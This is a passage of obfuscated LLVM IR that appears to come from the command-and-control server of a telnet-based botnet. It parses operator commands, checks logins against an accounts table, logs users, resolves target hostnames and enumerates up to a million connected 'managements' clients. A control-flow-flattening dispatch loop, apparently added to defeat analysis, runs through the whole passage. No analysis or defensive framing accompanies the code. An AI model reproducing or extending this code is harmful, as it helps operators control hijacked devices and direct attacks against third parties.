  %357 = getelementptr inbounds [100 x i8*], [100 x i8*]* %29, i32 0, i32 0
  %358 = bitcast i8** %357 to i8*
  %359 = call i32 @hostname_to_ip(i8* %356, i8* %358)
  %360 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %361 = load i8*, i8** %31, align 8
  %362 = getelementptr inbounds [100 x i8*], [100 x i8*]* %29, i32 0, i32 0
  %363 = call i32 (i8*, i8*, ...) @sprintf(i8* %360, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.47, i32 0, i32 0), i8* %361, i8** %362) #7
  %364 = load i32, i32* %4, align 4
  %365 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %366 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %367 = call i64 @strlen(i8* %366) #8
  %368 = call i64 @send(i32 %364, i8* %365, i64 %367, i32 16384)
  %369 = icmp eq i64 %368, -1
  %370 = select i1 %369, i32 643232779, i32 750869019
  store i32 %370, i32* %switchVar
  br label %loopEnd

; <label>:371:                                    ; preds = %loopEntry
  store i32 750869019, i32* %switchVar
  br label %loopEnd

; <label>:372:                                    ; preds = %loopEntry
  store i32 -283905322, i32* %switchVar
  br label %loopEnd

; <label>:373:                                    ; preds = %loopEntry
  %374 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %375 = call i8* @strstr(i8* %374, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.48, i32 0, i32 0)) #8
  %376 = icmp ne i8* %375, null
  %377 = select i1 %376, i32 1543435992, i32 1129517525
  store i32 %377, i32* %switchVar
  br label %loopEnd

; <label>:378:                                    ; preds = %loopEntry
  %379 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %380 = call i32 (i8*, i8*, ...) @sprintf(i8* %379, i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.49, i32 0, i32 0)) #7
  %381 = load i32, i32* %4, align 4
  %382 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %383 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %384 = call i64 @strlen(i8* %383) #8
  %385 = call i64 @send(i32 %381, i8* %382, i64 %384, i32 16384)
  %386 = icmp eq i64 %385, -1
  %387 = select i1 %386, i32 -1978137925, i32 1376370818
  store i32 %387, i32* %switchVar
  br label %loopEnd

; <label>:388:                                    ; preds = %loopEntry
  store i32 1376370818, i32* %switchVar
  br label %loopEnd

; <label>:389:                                    ; preds = %loopEntry
  %390 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %391 = call i32 (i8*, i8*, ...) @sprintf(i8* %390, i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.50, i32 0, i32 0)) #7
  %392 = load i32, i32* %4, align 4
  %393 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %394 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %395 = call i64 @strlen(i8* %394) #8
  %396 = call i64 @send(i32 %392, i8* %393, i64 %395, i32 16384)
  %397 = icmp eq i64 %396, -1
  %398 = select i1 %397, i32 97331076, i32 116223056
  store i32 %398, i32* %switchVar
  br label %loopEnd

; <label>:399:                                    ; preds = %loopEntry
  store i32 116223056, i32* %switchVar
  br label %loopEnd

; <label>:400:                                    ; preds = %loopEntry
  %401 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %402 = call i32 (i8*, i8*, ...) @sprintf(i8* %401, i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.51, i32 0, i32 0)) #7
  %403 = load i32, i32* %4, align 4
  %404 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %405 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %406 = call i64 @strlen(i8* %405) #8
  %407 = call i64 @send(i32 %403, i8* %404, i64 %406, i32 16384)
  %408 = icmp eq i64 %407, -1
  %409 = select i1 %408, i32 1065999748, i32 -1627707291
  store i32 %409, i32* %switchVar
  br label %loopEnd

; <label>:410:                                    ; preds = %loopEntry
  store i32 -1627707291, i32* %switchVar
  br label %loopEnd

; <label>:411:                                    ; preds = %loopEntry
  store i32 1129517525, i32* %switchVar
  br label %loopEnd

; <label>:412:                                    ; preds = %loopEntry
  %413 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %414 = call i8* @strstr(i8* %413, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.52, i32 0, i32 0)) #8
  %415 = icmp ne i8* %414, null
  %416 = select i1 %415, i32 1589651124, i32 -596451673
  store i32 %416, i32* %switchVar
  br label %loopEnd

; <label>:417:                                    ; preds = %loopEntry
  %418 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %419 = call i32 (i8*, i8*, ...) @sprintf(i8* %418, i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.53, i32 0, i32 0)) #7
  %420 = load i32, i32* %4, align 4
  %421 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %422 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %423 = call i64 @strlen(i8* %422) #8
  %424 = call i64 @send(i32 %420, i8* %421, i64 %423, i32 16384)
  %425 = icmp eq i64 %424, -1
  %426 = select i1 %425, i32 612304214, i32 295869015
  store i32 %426, i32* %switchVar
  br label %loopEnd

; <label>:427:                                    ; preds = %loopEntry
  store i32 295869015, i32* %switchVar
  br label %loopEnd

; <label>:428:                                    ; preds = %loopEntry
  %429 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %430 = call i32 (i8*, i8*, ...) @sprintf(i8* %429, i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.54, i32 0, i32 0)) #7
  %431 = load i32, i32* %4, align 4
  %432 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %433 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %434 = call i64 @strlen(i8* %433) #8
  %435 = call i64 @send(i32 %431, i8* %432, i64 %434, i32 16384)
  %436 = icmp eq i64 %435, -1
  %437 = select i1 %436, i32 -2147469229, i32 2039093834
  store i32 %437, i32* %switchVar
  br label %loopEnd

; <label>:438:                                    ; preds = %loopEntry
  store i32 2039093834, i32* %switchVar
  br label %loopEnd

; <label>:439:                                    ; preds = %loopEntry
  %440 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %441 = call i32 (i8*, i8*, ...) @sprintf(i8* %440, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.55, i32 0, i32 0)) #7
  %442 = load i32, i32* %4, align 4
  %443 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %444 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %445 = call i64 @strlen(i8* %444) #8
  %446 = call i64 @send(i32 %442, i8* %443, i64 %445, i32 16384)
  %447 = icmp eq i64 %446, -1
  %448 = select i1 %447, i32 1814769953, i32 1773469957
  store i32 %448, i32* %switchVar
  br label %loopEnd

; <label>:449:                                    ; preds = %loopEntry
  store i32 1773469957, i32* %switchVar
  br label %loopEnd

; <label>:450:                                    ; preds = %loopEntry
  store i32 -596451673, i32* %switchVar
  br label %loopEnd

; <label>:451:                                    ; preds = %loopEntry
  %452 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %453 = call i8* @strstr(i8* %452, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.56, i32 0, i32 0)) #8
  %454 = icmp ne i8* %453, null
  %455 = select i1 %454, i32 -1277591357, i32 1107192581
  store i32 %455, i32* %switchVar
  br label %loopEnd

; <label>:456:                                    ; preds = %loopEntry
  %457 = load i8*, i8** %12, align 8
  %458 = load i32, i32* %5, align 4
  %459 = sext i32 %458 to i64
  %460 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %459
  %461 = getelementptr inbounds %struct.account, %struct.account* %460, i32 0, i32 2
  %462 = getelementptr inbounds [200 x i8], [200 x i8]* %461, i32 0, i32 0
  %463 = call i32 @strcmp(i8* %457, i8* %462) #8
  %464 = icmp eq i32 %463, 0
  %465 = select i1 %464, i32 1749343821, i32 -712016774
  store i32 %465, i32* %switchVar
  br label %loopEnd

; <label>:466:                                    ; preds = %loopEntry
  %467 = load i8*, i8** %13, align 8
  %468 = load i32, i32* %5, align 4
  %469 = sext i32 %468 to i64
  %470 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %469
  %471 = getelementptr inbounds %struct.account, %struct.account* %470, i32 0, i32 2
  %472 = getelementptr inbounds [200 x i8], [200 x i8]* %471, i32 0, i32 0
  %473 = call i32 @strcmp(i8* %467, i8* %472) #8
  %474 = icmp eq i32 %473, 0
  %475 = select i1 %474, i32 1749343821, i32 911124475
  store i32 %475, i32* %switchVar
  br label %loopEnd

; <label>:476:                                    ; preds = %loopEntry
  %477 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %478 = call i32 (i8*, i8*, ...) @sprintf(i8* %477, i8* getelementptr inbounds ([51 x i8], [51 x i8]* @.str.57, i32 0, i32 0)) #7
  %479 = load i32, i32* %4, align 4
  %480 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %481 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %482 = call i64 @strlen(i8* %481) #8
  %483 = call i64 @send(i32 %479, i8* %480, i64 %482, i32 16384)
  %484 = icmp eq i64 %483, -1
  %485 = select i1 %484, i32 -546439021, i32 446352369
  store i32 %485, i32* %switchVar
  br label %loopEnd

; <label>:486:                                    ; preds = %loopEntry
  store i32 446352369, i32* %switchVar
  br label %loopEnd

; <label>:487:                                    ; preds = %loopEntry
  %488 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %489 = call i32 (i8*, i8*, ...) @sprintf(i8* %488, i8* getelementptr inbounds ([46 x i8], [46 x i8]* @.str.58, i32 0, i32 0)) #7
  %490 = load i32, i32* %4, align 4
  %491 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %492 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %493 = call i64 @strlen(i8* %492) #8
  %494 = call i64 @send(i32 %490, i8* %491, i64 %493, i32 16384)
  %495 = icmp eq i64 %494, -1
  %496 = select i1 %495, i32 69227980, i32 -1055144571
  store i32 %496, i32* %switchVar
  br label %loopEnd

; <label>:497:                                    ; preds = %loopEntry
  store i32 -1055144571, i32* %switchVar
  br label %loopEnd

; <label>:498:                                    ; preds = %loopEntry
  %499 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %500 = call i32 (i8*, i8*, ...) @sprintf(i8* %499, i8* getelementptr inbounds ([66 x i8], [66 x i8]* @.str.59, i32 0, i32 0)) #7
  %501 = load i32, i32* %4, align 4
  %502 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %503 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %504 = call i64 @strlen(i8* %503) #8
  %505 = call i64 @send(i32 %501, i8* %502, i64 %504, i32 16384)
  %506 = icmp eq i64 %505, -1
  %507 = select i1 %506, i32 1196637013, i32 926499919
  store i32 %507, i32* %switchVar
  br label %loopEnd

; <label>:508:                                    ; preds = %loopEntry
  store i32 926499919, i32* %switchVar
  br label %loopEnd

; <label>:509:                                    ; preds = %loopEntry
  %510 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %511 = call i32 (i8*, i8*, ...) @sprintf(i8* %510, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.60, i32 0, i32 0)) #7
  %512 = load i32, i32* %4, align 4
  %513 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %514 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %515 = call i64 @strlen(i8* %514) #8
  %516 = call i64 @send(i32 %512, i8* %513, i64 %515, i32 16384)
  %517 = icmp eq i64 %516, -1
  %518 = select i1 %517, i32 -1824756271, i32 308920592
  store i32 %518, i32* %switchVar
  br label %loopEnd

; <label>:519:                                    ; preds = %loopEntry
  store i32 308920592, i32* %switchVar
  br label %loopEnd

; <label>:520:                                    ; preds = %loopEntry
  %521 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %522 = call i32 (i8*, i8*, ...) @sprintf(i8* %521, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.61, i32 0, i32 0)) #7
  %523 = load i32, i32* %4, align 4
  %524 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %525 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %526 = call i64 @strlen(i8* %525) #8
  %527 = call i64 @send(i32 %523, i8* %524, i64 %526, i32 16384)
  %528 = icmp eq i64 %527, -1
  %529 = select i1 %528, i32 -1893451340, i32 1974493295
  store i32 %529, i32* %switchVar
  br label %loopEnd

; <label>:530:                                    ; preds = %loopEntry
  store i32 1974493295, i32* %switchVar
  br label %loopEnd

; <label>:531:                                    ; preds = %loopEntry
  store i32 -1986171632, i32* %switchVar
  br label %loopEnd

; <label>:532:                                    ; preds = %loopEntry
  %533 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %534 = call i32 (i8*, i8*, ...) @sprintf(i8* %533, i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.62, i32 0, i32 0)) #7
  %535 = load i32, i32* %4, align 4
  %536 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %537 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %538 = call i64 @strlen(i8* %537) #8
  %539 = call i64 @send(i32 %535, i8* %536, i64 %538, i32 16384)
  %540 = icmp eq i64 %539, -1
  %541 = select i1 %540, i32 -849284405, i32 -151197069
  store i32 %541, i32* %switchVar
  br label %loopEnd

; <label>:542:                                    ; preds = %loopEntry
  store i32 -151197069, i32* %switchVar
  br label %loopEnd

; <label>:543:                                    ; preds = %loopEntry
  store i32 -1986171632, i32* %switchVar
  br label %loopEnd

; <label>:544:                                    ; preds = %loopEntry
  store i32 1107192581, i32* %switchVar
  br label %loopEnd

; <label>:545:                                    ; preds = %loopEntry
  %546 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %547 = call i8* @strstr(i8* %546, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.63, i32 0, i32 0)) #8
  %548 = icmp ne i8* %547, null
  %549 = select i1 %548, i32 -6841393, i32 2039774232
  store i32 %549, i32* %switchVar
  br label %loopEnd

; <label>:550:                                    ; preds = %loopEntry
  %551 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %552 = call i32 (i8*, i8*, ...) @sprintf(i8* %551, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.64, i32 0, i32 0)) #7
  %553 = load i32, i32* %4, align 4
  %554 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %555 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %556 = call i64 @strlen(i8* %555) #8
  %557 = call i64 @send(i32 %553, i8* %554, i64 %556, i32 16384)
  %558 = icmp eq i64 %557, -1
  %559 = select i1 %558, i32 1714003181, i32 2094472058
  store i32 %559, i32* %switchVar
  br label %loopEnd

; <label>:560:                                    ; preds = %loopEntry
  store i32 2094472058, i32* %switchVar
  br label %loopEnd

; <label>:561:                                    ; preds = %loopEntry
  %562 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %563 = call i32 (i8*, i8*, ...) @sprintf(i8* %562, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.65, i32 0, i32 0)) #7
  %564 = load i32, i32* %4, align 4
  %565 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %566 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %567 = call i64 @strlen(i8* %566) #8
  %568 = call i64 @send(i32 %564, i8* %565, i64 %567, i32 16384)
  %569 = icmp eq i64 %568, -1
  %570 = select i1 %569, i32 -736509453, i32 -1368395742
  store i32 %570, i32* %switchVar
  br label %loopEnd

; <label>:571:                                    ; preds = %loopEntry
  store i32 -1368395742, i32* %switchVar
  br label %loopEnd

; <label>:572:                                    ; preds = %loopEntry
  store i32 2039774232, i32* %switchVar
  br label %loopEnd

; <label>:573:                                    ; preds = %loopEntry
  %574 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %575 = call i8* @strstr(i8* %574, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.66, i32 0, i32 0)) #8
  %576 = icmp ne i8* %575, null
  %577 = select i1 %576, i32 18266575, i32 1728064224
  store i32 %577, i32* %switchVar
  br label %loopEnd

; <label>:578:                                    ; preds = %loopEntry
  %579 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %580 = call i8* @strstr(i8* %579, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.67, i32 0, i32 0)) #8
  %581 = icmp ne i8* %580, null
  %582 = select i1 %581, i32 18266575, i32 467106855
  store i32 %582, i32* %switchVar
  br label %loopEnd

; <label>:583:                                    ; preds = %loopEntry
  %584 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %585 = call i32 (i8*, i8*, ...) @sprintf(i8* %584, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.68, i32 0, i32 0)) #7
  %586 = load i32, i32* %4, align 4
  %587 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %588 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %589 = call i64 @strlen(i8* %588) #8
  %590 = call i64 @send(i32 %586, i8* %587, i64 %589, i32 16384)
  %591 = icmp eq i64 %590, -1
  %592 = select i1 %591, i32 -552941679, i32 -1277388322
  store i32 %592, i32* %switchVar
  br label %loopEnd

; <label>:593:                                    ; preds = %loopEntry
  store i32 -1277388322, i32* %switchVar
  br label %loopEnd

; <label>:594:                                    ; preds = %loopEntry
  %595 = load i32, i32* %4, align 4
  %596 = call i64 @send(i32 %595, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.69, i32 0, i32 0), i64 17, i32 16384)
  %597 = icmp eq i64 %596, -1
  %598 = select i1 %597, i32 -937284162, i32 1226138082
  store i32 %598, i32* %switchVar
  br label %loopEnd

; <label>:599:                                    ; preds = %loopEntry
  store i32 182375132, i32* %switchVar
  br label %loopEnd

; <label>:600:                                    ; preds = %loopEntry
  %601 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.70, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.31, i32 0, i32 0))
  store %struct._IO_FILE* %601, %struct._IO_FILE** %32, align 8
  %602 = load %struct._IO_FILE*, %struct._IO_FILE** %32, align 8
  %603 = load i32, i32* %5, align 4
  %604 = sext i32 %603 to i64
  %605 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %604
  %606 = getelementptr inbounds %struct.account, %struct.account* %605, i32 0, i32 0
  %607 = getelementptr inbounds [200 x i8], [200 x i8]* %606, i32 0, i32 0
  %608 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %602, i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.71, i32 0, i32 0), i8* %607)
  %609 = load %struct._IO_FILE*, %struct._IO_FILE** %32, align 8
  %610 = call i32 @fclose(%struct._IO_FILE* %609)
  %611 = load i32, i32* %5, align 4
  %612 = sext i32 %611 to i64
  %613 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %612
  %614 = getelementptr inbounds %struct.account, %struct.account* %613, i32 0, i32 0
  %615 = getelementptr inbounds [200 x i8], [200 x i8]* %614, i32 0, i32 0
  %616 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.71, i32 0, i32 0), i8* %615)
  store i32 467106855, i32* %switchVar
  br label %loopEnd

; <label>:617:                                    ; preds = %loopEntry
  %618 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %619 = call i8* @strstr(i8* %618, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.72, i32 0, i32 0)) #8
  %620 = icmp ne i8* %619, null
  %621 = select i1 %620, i32 -399374533, i32 418127877
  store i32 %621, i32* %switchVar
  br label %loopEnd

; <label>:622:                                    ; preds = %loopEntry
  %623 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.70, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.31, i32 0, i32 0))
  store %struct._IO_FILE* %623, %struct._IO_FILE** %33, align 8
  %624 = load %struct._IO_FILE*, %struct._IO_FILE** %33, align 8
  %625 = load i32, i32* %5, align 4
  %626 = sext i32 %625 to i64
  %627 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %626
  %628 = getelementptr inbounds %struct.account, %struct.account* %627, i32 0, i32 0
  %629 = getelementptr inbounds [200 x i8], [200 x i8]* %628, i32 0, i32 0
  %630 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %624, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.73, i32 0, i32 0), i8* %629)
  %631 = load %struct._IO_FILE*, %struct._IO_FILE** %33, align 8
  %632 = call i32 @fclose(%struct._IO_FILE* %631)
  %633 = load i32, i32* %5, align 4
  %634 = sext i32 %633 to i64
  %635 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %634
  %636 = getelementptr inbounds %struct.account, %struct.account* %635, i32 0, i32 0
  %637 = getelementptr inbounds [200 x i8], [200 x i8]* %636, i32 0, i32 0
  %638 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.73, i32 0, i32 0), i8* %637)
  store i32 418127877, i32* %switchVar
  br label %loopEnd

; <label>:639:                                    ; preds = %loopEntry
  %640 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %641 = call i8* @strstr(i8* %640, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.74, i32 0, i32 0)) #8
  %642 = icmp ne i8* %641, null
  %643 = select i1 %642, i32 -2087162627, i32 982798375
  store i32 %643, i32* %switchVar
  br label %loopEnd

; <label>:644:                                    ; preds = %loopEntry
  %645 = load i32, i32* %4, align 4
  %646 = call i64 @send(i32 %645, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.36, i32 0, i32 0), i64 16, i32 16384)
  %647 = icmp eq i64 %646, -1
  %648 = select i1 %647, i32 -586185379, i32 -1949477042
  store i32 %648, i32* %switchVar
  br label %loopEnd

; <label>:649:                                    ; preds = %loopEntry
  store i32 182375132, i32* %switchVar
  br label %loopEnd

; <label>:650:                                    ; preds = %loopEntry
  store i32 982798375, i32* %switchVar
  br label %loopEnd

; <label>:651:                                    ; preds = %loopEntry
  %652 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %653 = call i8* @strstr(i8* %652, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.75, i32 0, i32 0)) #8
  %654 = icmp ne i8* %653, null
  %655 = select i1 %654, i32 -1636707554, i32 1512487413
  store i32 %655, i32* %switchVar
  br label %loopEnd

; <label>:656:                                    ; preds = %loopEntry
  %657 = load i8*, i8** %12, align 8
  %658 = load i32, i32* %5, align 4
  %659 = sext i32 %658 to i64
  %660 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %659
  %661 = getelementptr inbounds %struct.account, %struct.account* %660, i32 0, i32 2
  %662 = getelementptr inbounds [200 x i8], [200 x i8]* %661, i32 0, i32 0
  %663 = call i32 @strcmp(i8* %657, i8* %662) #8
  %664 = icmp eq i32 %663, 0
  %665 = select i1 %664, i32 -1420994877, i32 -79539252
  store i32 %665, i32* %switchVar
  br label %loopEnd

; <label>:666:                                    ; preds = %loopEntry
  %667 = load i8*, i8** %13, align 8
  %668 = load i32, i32* %5, align 4
  %669 = sext i32 %668 to i64
  %670 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %669
  %671 = getelementptr inbounds %struct.account, %struct.account* %670, i32 0, i32 2
  %672 = getelementptr inbounds [200 x i8], [200 x i8]* %671, i32 0, i32 0
  %673 = call i32 @strcmp(i8* %667, i8* %672) #8
  %674 = icmp eq i32 %673, 0
  %675 = select i1 %674, i32 -1420994877, i32 1216108839
  store i32 %675, i32* %switchVar
  br label %loopEnd

; <label>:676:                                    ; preds = %loopEntry
  %677 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %678 = call i8* @strcpy(i8* %677, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.76, i32 0, i32 0)) #7
  %679 = load i32, i32* %4, align 4
  %680 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %681 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %682 = call i64 @strlen(i8* %681) #8
  %683 = call i64 @send(i32 %679, i8* %680, i64 %682, i32 16384)
  %684 = icmp eq i64 %683, -1
  %685 = select i1 %684, i32 185426347, i32 -2057198209
  store i32 %685, i32* %switchVar
  br label %loopEnd

; <label>:686:                                    ; preds = %loopEntry
  store i8* null, i8** %2, align 8
  store i32 -513466081, i32* %switchVar
  br label %loopEnd

; <label>:687:                                    ; preds = %loopEntry
  store i32 0, i32* %34, align 4
  store i32 -797897037, i32* %switchVar
  br label %loopEnd

; <label>:688:                                    ; preds = %loopEntry
  %689 = load i32, i32* %34, align 4
  %690 = icmp slt i32 %689, 1000000
  %691 = select i1 %690, i32 540006542, i32 -1770316660
  store i32 %691, i32* %switchVar
  br label %loopEnd

; <label>:692:                                    ; preds = %loopEntry
  %693 = load i32, i32* %34, align 4
  %694 = sext i32 %693 to i64
  %695 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %694
  %696 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %695, i32 0, i32 2
  %697 = getelementptr inbounds [20 x i8], [20 x i8]* %696, i32 0, i32 0
  %698 = call i64 @strlen(i8* %697) #8
  %699 = icmp ugt i64 %698, 1
  %700 = select i1 %699, i32 570292890, i32 573169261
  store i32 %700, i32* %switchVar
  br label %loopEnd

; <label>:701:                                    ; preds = %loopEntry
  %702 = load i32, i32* %34, align 4
  %703 = sext i32 %702 to i64
  %704 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %703
  %705 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %704, i32 0, i32 1
  %706 = load i32, i32* %705, align 4
  %707 = icmp eq i32 %706, 1
  %708 = select i1 %707, i32 -462916123, i32 573169261
  store i32 %708, i32* %switchVar
  br label %loopEnd

; <label>:709:                                    ; preds = %loopEntry
  %710 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %711 = load i32, i32* %34, align 4
  %712 = load i32, i32* %34, align 4
  %713 = sext i32 %712 to i64
  %714 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %713
  %715 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %714, i32 0, i32 2
  %716 = getelementptr inbounds [20 x i8], [20 x i8]* %715, i32 0, i32 0
  %717 = call i32 (i8*, i8*, ...) @sprintf(i8* %710, i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.77, i32 0, i32 0), i32 %711, i8* %716) #7
  %718 = load i32, i32* %4, align 4
  %719 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %720 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %721 = call i64 @strlen(i8* %720) #8
  %722 = call i64 @send(i32 %718, i8* %719, i64 %721, i32 16384)
  %723 = icmp eq i64 %722, -1
  %724 = select i1 %723, i32 1958534612, i32 1057823068
  store i32 %724, i32* %switchVar
  br label %loopEnd

; <label>:725:                                    ; preds = %loopEntry
  store i8* null, i8** %2, align 8
  store i32 -513466081, i32* %switchVar
  br label %loopEnd

; <label>:726:                                    ; preds = %loopEntry
  store i32 573169261, i32* %switchVar
  br label %loopEnd

; <label>:727:                                    ; preds = %loopEntry
  store i32 -396241523, i32* %switchVar
  br label %loopEnd

; <label>:728:                                    ; preds = %loopEntry
  %729 = load i32, i32* %34, align 4
  %730 = add nsw i32 %729, 1
  store i32 %730, i32* %34, align 4
  store i32 -797897037, i32* %switchVar
  br label %loopEnd

; <label>:731:                                    ; preds = %loopEntry
  store i32 1228708119, i32* %switchVar
  br label %loopEnd

; <label>:732:                                    ; preds = %loopEntry
  %733 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
